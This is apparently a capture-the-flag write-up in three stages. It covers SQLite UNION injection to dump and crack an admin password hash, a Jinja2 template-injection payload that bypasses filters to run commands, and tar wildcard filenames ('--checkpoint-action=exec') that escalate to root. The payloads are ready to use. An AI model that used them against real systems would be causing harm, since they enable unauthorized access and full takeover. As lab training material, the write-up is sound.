# Born To be admin 1/3

The first vulnerability is an SQLi in the search bar. Which means we will be able to leak data using the search bar.
We will try to uncover the admin's credentials.

## Get tables and collums name
### Table name
We can use Payload All the Things to help us :
Under `Sqlite` > `Integer/String based - Extract table name` we can find the following [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#integerstring-based---extract-table-name) :

`SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'`

Which we arrange into :
`aaaaa' UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -`

We get : `users,data`

### Collumns name
As we know there is a `users` table, we can try and leak the [collumns names](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#integerstring-based---extract-column-name):
`aaaaaa' UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'-- -`

We get : `CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username VARCHAR(100) NOT NULL, password VARCHAR(100) NOT NULL, is_admin BOOLEAN NOT NULL DEFAULT 0 )`

So the table looks like : | id (int) | username (str) | password (str) | is_admin (bool) |

We can start uncovering the admin's credentials

## Get admin's username
`' UNION SELECT username FROM users WHERE is_admin=true-- -`

You get : `redpanda-master`

## Get user's password
`' UNION SELECT password FROM users WHERE is_admin=true-- -`

You get : `61983636aae8819f9a94b39bd0e6219d2212f0bcc37bb11032b559d6df26b07f`
Which is part of rockyou and can be cracked using https://crackstation.net/
The password is `redpandas4ever`

## Login to the admin's account
We use the login form to login :
`redpanda-master`
`redpandas4ever`

# Born to be user 2/3
In this part the vulnerability is an ssti on the admin panel, the goal is to get a shell or at least RCE.

## Discovering the SSTI
When inputing `{{7*7}}` in the text box, we get the following result : `Hello, redpanda-master. You searched for the username 49, here is your results :`

We can see the 49, so our ssti is working, let's exploit it.

## Filters
There is two small filters on this ssti : `'`, `.` and `_` are banned.
We can see it when inputing `.`, we get : `Error : . _ and ' are filtered to avoid interfering with sql.`

## Exploit
We can use payload all the things once again to start our payload : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread

We will use podalirius' payload because it's the shortest :
`{{ lipsum.__globals__["os"].popen('id').read() }}`

We can see there is `.`, `'` and `_` in the payload we got to remove :

1. Removing '
	We can use double quote (") instead of single ones (')
2. Removing .
	We can use `|attr()` instead of `.` in jinja2
3. Removing _
	We can encode `_` in `\x5f`
4. Removing [ because it doesnt work with attr
	We can use the function `get` instead

Final payload : `{{lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("get")("os")|attr("popen")("cat flag\x2etxt")|attr("read")()}}`

# Born To be Root 3/3

```sh
echo -e \"#!/bin/bash\\ncat /root/* > result\" > shell\x2esh
echo \"\" > \"--checkpoint-action=exec=sh shell\x2esh\"
echo \"\" > --checkpoint=1
# Wait one minute
ls -la
# If there is result, you can cat it.
cat result
```
We get `NBCTF{You&#39;ve_Really_Becomed_Th3_R3d_Panda_And_Red_Team_Master!}` which desencode to :

> NBCTF{You've_Really_Becomed_Th3_R3d_Panda_And_Red_Team_Master!}
